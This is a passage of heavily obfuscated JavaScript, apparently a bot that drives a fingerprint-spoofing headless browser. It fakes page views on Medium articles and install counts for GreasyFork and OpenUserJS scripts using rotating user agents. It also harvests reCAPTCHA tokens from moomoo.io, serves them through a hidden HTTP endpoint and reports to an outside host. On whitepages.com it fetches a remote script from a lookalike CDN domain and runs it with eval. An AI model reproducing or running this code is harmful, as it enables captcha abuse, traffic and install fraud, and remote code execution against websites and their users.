      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + V(0x1b) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    X(0x1f, '6H9u') + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    V(0xa) + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + X(0x4, '$((W'),
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    X(0x2, '[Tt[') + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x48e + 0x1ad4 + -0x1646
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1f21 + 0x5 * 0x5e1 + 0x1bc);
    let h = e[f];
    if (c['QjHHop'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x50 * -0x4c + -0x8ba + 0x207a * 0x1, r, s, t = -0x260f + 0x29d + 0x2372; s = m['charAt'](t++); ~s && (r = q % (-0x3 * -0x71 + 0xc3c + -0xd8b * 0x1) ? r * (-0x2 * -0x6e2 + -0x727 * -0x1 + -0x197 * 0xd) + s : s, q++ % (-0x369 + -0x395 + -0x3 * -0x256)) ? o += String['fromCharCode'](0x2 * 0xe1d + 0xea5 * 0x1 + -0x43 * 0xa0 & r >> (-(-0x178 * -0x9 + -0xe14 * 0x1 + 0xde) * q & -0x313 + 0x771 + -0x458)) : -0x79 * -0x23 + 0x14f * -0x2 + 0xded * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x4ff + 0x18bf + 0x3 * -0x9ea, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1b6d * -0x1 + 0x23a6 + -0x829 * 0x1))['slice'](-(0x1 * 0x1750 + 0x208b * 0x1 + -0x349 * 0x11));
        }
        return decodeURIComponent(p);
      };
      c['YIlOlu'] = i, b = arguments, c['QjHHop'] = !![];
    }
    const j = e[0x4 * 0x741 + -0x76a + -0xa * 0x229],
      k = f + j,
      l = b[k];
    return !l ? (h = c['YIlOlu'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1f21 + 0x5 * 0x5e1 + 0x1bc);
    let h = e[f];
    if (b['Pfpjpq'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x50 * -0x4c + -0x8ba + 0x207a * 0x1, s, t, u = -0x260f + 0x29d + 0x2372; t = n['charAt'](u++); ~t && (s = r % (-0x3 * -0x71 + 0xc3c + -0xd8b * 0x1) ? s * (-0x2 * -0x6e2 + -0x727 * -0x1 + -0x197 * 0xd) + t : t, r++ % (-0x369 + -0x395 + -0x3 * -0x256)) ? p += String['fromCharCode'](0x2 * 0xe1d + 0xea5 * 0x1 + -0x43 * 0xa0 & s >> (-(-0x178 * -0x9 + -0xe14 * 0x1 + 0xde) * r & -0x313 + 0x771 + -0x458)) : -0x79 * -0x23 + 0x14f * -0x2 + 0xded * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x4ff + 0x18bf + 0x3 * -0x9ea, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1b6d * -0x1 + 0x23a6 + -0x829 * 0x1))['slice'](-(0x1 * 0x1750 + 0x208b * 0x1 + -0x349 * 0x11));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x4 * 0x741 + -0x76a + -0xa * 0x229,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x2030 + -0x6 * 0x3e + 0x21a4; u < 0x20bd + -0x1b88 + -0x435 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0xe * -0x31 + 0x1132 + -0xe84; u < -0x4c7 * -0x1 + -0x55d * 0x2 + 0x6f3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x38f + -0x108a + 0x1 * 0x1519), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x85c + -0x2679 + 0x2ed5, q = 0x2 * -0xf62 + 0x3 * 0x2e5 + -0x1615 * -0x1;
        for (let v = 0x115 * -0x18 + 0x2448 + -0xa50; v < n['length']; v++) {
          u = (u + (0x1fe6 + -0x1 * 0x1486 + -0xb5f)) % (-0x1a34 + 0xa31 + 0x1103), q = (q + p[u]) % (0x2 * 0x11c9 + -0x3 * 0x419 + -0x1647), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x374 + 0xab + -0x31f)]);
        }
        return t;
      };
      b['ooFCaI'] = m, c = arguments, b['Pfpjpq'] = !![];
    }
    const j = e[0x106 * 0x1d + -0x1477 + -0x937 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['CfsjmX'] === undefined && (b['CfsjmX'] = !![]), h = b['ooFCaI'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * -0xdd5 + 0x1 * -0x267 + 0x5b7 * -0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xb11 + -0x8a1 + 0x4 * -0x83), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xf9d + 0x1a9f + -0xa9e), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x3 * 0x869 + 0xb12 + -0x244d;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x127 * 0x1d + 0x14a + 0x2021; w < getRandomInt(-0x265d + 0x95c * -0x3 + 0x4272, -0x165e + 0x123b * -0x1 + 0xd8a * 0x3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x2ba * -0x8 + 0x199b0 + -0xc520);
        }
      }();
    }, 0x80 * -0x4c + -0x1922 * 0x1 + 0x2 * 0x1fc3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x17be + -0x1587 + 0x2d45;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v[Y(0x16)](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1f9c + 0x1de4 + -0x2 * 0x1ec0, -0x180e * -0x1 + 0x20fe + -0x38da * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5e80 + 0x6363 + -0x4cb3);
    }, -0x1be4 + -0xd9c * -0x2 + -0x11 * -0x10), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x20fd + 0xac4 + -0x17 * 0x1e7;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xaab + 0x17b1 * -0x1 + 0x18be), await u['evaluate'](() => {
            const Z = b;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + Z(0x6, 'LaU(') + 'me/cdn/xm7' + '7/wp.js', 0x2c * -0x70 + -0x3c4 * 0x1 + 0x2 * 0xb82), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * -0xc85fa + 0x179b6 + -0x6 * 0xb58);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xb2e + -0x1066 + 0x59c);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x696 * 0x4 + -0xf4 * -0x1b + 0x164);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x6 * 0xb7 + 0x5b7 * -0x5 + 0x406d);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = d,
    a3 = c,
    a2 = b;
  async function f() {
    const a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x190c + -0x932 + 0xb * 0x31d) {
        const a0 = b;
        if (A[a0(0x18, '4l!x')]('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x3 * 0x5c3 + -0x2372 + 0x1 * 0x122a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xc1c + -0x800 + -0x41c, D['indexOf']('\x20'));
        return B ? E['slice'](0x28d * 0xb + -0x1 * -0xc91 + -0x514 * 0x8, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x169d + -0x3b97 + -0x4c0a * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x2516 * 0x1 + 0x42 * -0x39 + 0xc2 * 0x16),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': a1(0x11)
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + a2(0x20, 'vJOT') + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + a3(0x12) + 'ore!!',
      'https://op' + 'enuserjs.o' + a2(0xe, '70il') + a4(0x0) + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + a2(0x13, 'vJOT'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + a2(0x9, 'BlSW') + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + a2(0x1c, '[Tt[') + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + a2(0x1d, 'fz]g') + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
